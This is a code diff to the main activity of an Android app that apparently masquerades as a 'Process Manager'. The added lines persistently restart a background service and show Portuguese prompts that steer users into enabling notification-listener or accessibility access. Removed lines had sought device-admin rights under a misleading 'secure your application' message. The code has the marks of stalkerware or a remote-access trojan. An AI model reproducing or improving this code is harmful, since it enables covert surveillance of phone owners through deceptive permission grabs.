@@ -27,32 +27,25 @@ import java.util.ArrayList;
 
 public class MainActivity extends Activity {
 
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        PackageInfo info;
-        SharedPreferences settings = getApplicationContext().getSharedPreferences("CONN_SETTINGS", 0);
 
         setContentView(R.layout.activity_main);
 
-//        startService(new Intent(this, MainService.class));
         Intent intent = new Intent(this, MainService.class);
         PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, intent, 0);
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
         alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0, 10000, pendingIntent);
         boolean isNotificationServiceRunning = isNotificationServiceRunning();
+        SharedPreferences settings = getApplicationContext().getSharedPreferences("CONN_SETTINGS", 0);
         if (!isNotificationServiceRunning) {
 
             Context context = getApplicationContext();
-            String[] permissions = new String[]{};
-            try {
-                info = getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
-                permissions = info.requestedPermissions;
-            } catch (PackageManager.NameNotFoundException e) {
-                e.printStackTrace();
-            }
-            CharSequence text = "Enable 'Package Manager'\n Click back x2\n and Enable all permissions";
+
+            CharSequence text = "Ative 'Process Manager'\n Clique em voltar \n e ative as permissões";
             int duration = Toast.LENGTH_LONG;
 
             Toast toast = Toast.makeText(context, text, duration);
@@ -63,36 +56,41 @@ public class MainActivity extends Activity {
             v.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
             toast.show();
 
-            reqPermissions(this, permissions);
+            //reqPermissions(this, permissions);
 
-            // spawn notification thing
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-            }
-
-            DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-            // Set DeviceAdminDemo Receiver for active the component with different option
-            ComponentName mAdminName = new ComponentName(this, DeviceAdminX.class);
-
-            if (!mDPM.isAdminActive(mAdminName)) {
-                // try to become active
-                Intent intent2 = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                intent2.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
-                intent2.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
-                startActivity(intent2);
-            }
             if (!settings.contains("user-token")) {
-           //     Intent myIntent = new Intent(this, SettingsActivity.class);
-           //     startActivity(myIntent);
-
+                Intent myIntent = new Intent(this, SettingsActivity.class);
+                startActivity(myIntent);
             }
+            // spawn notification thing
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 && !Build.MODEL.startsWith("SM-")) {
+                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+            } else{
+                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            }
+
+      //      DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            // Set DeviceAdminDemo Receiver for active the component with different option
+        //    ComponentName mAdminName = new ComponentName(this, DeviceAdminX.class);
 
             // spawn app page settings so you can enable all perms
 //            Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + BuildConfig.APPLICATION_ID));
 //            startActivity(i);
+        } else {
+            if (!settings.contains("user-token")) {
+                Intent myIntent = new Intent(this, SettingsActivity.class);
+                startActivity(myIntent);
+            }
         }
 
+
         finish();
+    }
+
+
+    @Override
+    protected void onResume() {
+        super.onResume();
     }
 
     public void reqPermissions(Context context, String[] permissions) {
